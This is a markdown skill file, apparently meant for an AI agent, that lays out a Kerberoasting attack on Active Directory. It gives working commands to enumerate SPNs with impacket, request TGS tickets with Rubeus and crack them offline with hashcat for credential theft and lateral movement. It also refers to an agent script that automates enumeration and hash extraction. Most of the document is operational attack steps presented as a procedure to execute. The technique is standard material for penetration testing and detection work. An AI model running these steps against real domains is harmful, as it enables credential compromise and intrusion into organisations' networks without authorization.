<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: performing-kerberoasting-attacks
description: >-
  Execute Kerberoasting attacks to extract service account TGS tickets and crack them offline for credential compromise and lateral movement.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - kerberoasting
  - spn
  - tgs
  - credential-theft
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1558.003"]
  frameworks: ["MITRE ATT&CK"]
  tools: ["impacket", "rubeus", "hashcat"]
---

# Performing Kerberoasting Attacks

## Overview

Execute Kerberoasting attacks to extract service account TGS tickets and crack them offline for credential compromise and lateral movement.

## Prerequisites

- Tools: `impacket`, `rubeus`, `hashcat`
- Impacket suite, Rubeus, domain credentials, hashcat

## Quick Reference

```bash
# Quick start commands
python3 scripts/agent.py --help
impacket-GetUserSPNs -dc-ip {dc_ip} {domain}/{user}:{pass}
```

## Workflow

### Step 1: Enumerate SPNs

```bash
impacket-GetUserSPNs -dc-ip {dc_ip} {domain}/{user}:{pass}
```

### Step 2: Request TGS Tickets

```bash
Rubeus.exe kerberoast /outfile:tgs_hashes.txt
```

### Step 3: Crack Tickets Offline

```bash
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```


## Verification

- **Verify SPN targets found**: `python3 scripts/agent.py enumerate --domain corp.local --dc-ip 10.0.0.1`
- **Confirm hash extraction**: `python3 scripts/agent.py extract --domain corp.local --dc-ip 10.0.0.1`

## References

- MITRE ATT&CK: T1558.003
- Frameworks: MITRE ATT&CK
- Tools: impacket, rubeus, hashcat
